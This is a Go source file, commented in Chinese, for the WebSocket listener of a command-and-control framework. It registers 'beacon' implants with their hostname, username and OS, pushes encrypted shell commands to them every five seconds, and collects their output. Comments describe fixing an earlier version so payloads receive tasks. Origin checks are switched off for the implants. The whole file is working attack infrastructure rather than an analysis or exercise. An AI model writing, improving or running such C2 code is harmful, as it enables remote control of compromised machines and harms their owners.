package main

// WebSocket 监听器
//
//   客户端消息: 加密 JSON —— register {hostname,username,os} / result {task_id,output}
//   服务端推送: 加密 JSON —— exec {command,task_id} / heartbeat（每 5s 主动轮询推送）
//
// 修复项：Python 版为纯请求-响应模式，payload 发送 register 后阻塞在接收，
// 永远收不到 exec（原 README 已知问题 1）。此处改为服务端主动推送循环（与 TCP 一致）。
import (
	"context"
	"encoding/json"
	"net/http"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

var wsUpgrader = websocket.Upgrader{
	ReadBufferSize:  4096,
	WriteBufferSize: 4096,
	// C2 beacon 客户端不带 Origin，放行（监听器本身即信任边界）
	CheckOrigin: func(r *http.Request) bool { return true },
}

type wsSession struct {
	conn  *websocket.Conn
	l     *listenerMeta
	br    *Bridge
	sid   string
	mu    sync.Mutex // gorilla 并发写不安全，推送/响应共用写锁
	done  chan struct{}
	once  sync.Once
}

func (s *wsSession) send(msg map[string]string) error {
	enc, err := Encrypt(mustJSON(msg), s.l.Secret, s.l.Encrypt)
	if err != nil {
		return err
	}
	s.mu.Lock()
	defer s.mu.Unlock()
	s.conn.SetWriteDeadline(time.Now().Add(15 * time.Second))
	return s.conn.WriteMessage(websocket.TextMessage, []byte(enc))
}

func (s *wsSession) shutdown() {
	s.once.Do(func() { close(s.done) })
}

func startWS(ctx context.Context, l *listenerMeta, br *Bridge) error {
	mux := http.NewServeMux()
	mux.HandleFunc("/beacon", func(w http.ResponseWriter, r *http.Request) {
		conn, err := wsUpgrader.Upgrade(w, r, nil)
		if err != nil {
			logf("[ws:%s] 升级失败: %v", l.ID, err)
			return
		}
		defer conn.Close()
		remote := remoteIP(r)
		logf("[ws:%s] WS 新连接 %s", l.ID, remote)

		sid, err := br.Checkin(CheckinRequest{ListenerID: l.ID, RemoteAddr: remote})
		if err != nil {
			logf("[ws:%s] 会话注册失败: %v", l.ID, err)
			return
		}
		logf("[ws:%s] 会话已注册 %s (%s)", l.ID, sid, remote)

		s := &wsSession{conn: conn, l: l, br: br, sid: sid, done: make(chan struct{})}
		defer br.Dead(sid)

		// 读循环：处理 register / result
		go func() {
			defer s.shutdown()
			for {
				msgType, raw, err := conn.ReadMessage()
				if err != nil {
					select {
					case <-ctx.Done():
					default:
						logf("[ws:%s] 会话断开 %s: %v", l.ID, sid, err)
					}
					return
				}
				if msgType != websocket.TextMessage {
					continue
				}
				plain, ok := mustDecryptOrEmpty(string(raw), l.Secret, l.Encrypt)
				if !ok {
					logf("[ws:%s] 消息解密失败 %s", l.ID, sid)
					continue
				}
				var data struct {
					Type     string `json:"type"`
					Hostname string `json:"hostname"`
					Username string `json:"username"`
					OS       string `json:"os"`
					TaskID   string `json:"task_id"`
					Output   string `json:"output"`
				}
				if json.Unmarshal([]byte(plain), &data) != nil {
					continue
				}
				switch data.Type {
				case msgRegister:
					_ = br.Meta(sid, data.Hostname, data.Username, data.OS)
				case msgResult:
					_ = br.Result(sid, data.TaskID, data.Output)
				}
			}
		}()

		// 推送循环：每 5s 轮询任务（修复原版纯请求-响应的死锁）
		ticker := time.NewTicker(5 * time.Second)
		defer ticker.Stop()
		push := func() {
			task, err := br.Poll(sid)
			if err != nil {
				logf("[ws:%s] 拉取任务失败: %v", l.ID, err)
				return
			}
			var resp map[string]string
			if task != nil {
				resp = map[string]string{"type": msgExec, "command": task.Command, "task_id": task.TaskID}
			} else {
				resp = map[string]string{"type": msgHeartbeat}
			}
			if err := s.send(resp); err != nil {
				logf("[ws:%s] 推送失败 %s: %v", l.ID, sid, err)
				s.shutdown()
			}
		}
		push() // 连接后立即推送一次
		for {
			select {
			case <-ctx.Done():
				s.shutdown()
				return
			case <-s.done:
				return
			case <-ticker.C:
				push()
			}
		}
	})

	srv := &http.Server{Addr: l.addr(), Handler: mux, ReadHeaderTimeout: 10 * time.Second}
	go func() {
		<-ctx.Done()
		shutdownCtx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
		defer cancel()
		_ = srv.Shutdown(shutdownCtx)
	}()
	go func() {
		if err := srv.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			logf("[ws:%s] 监听失败: %v", l.ID, err)
		}
	}()
	return nil
}
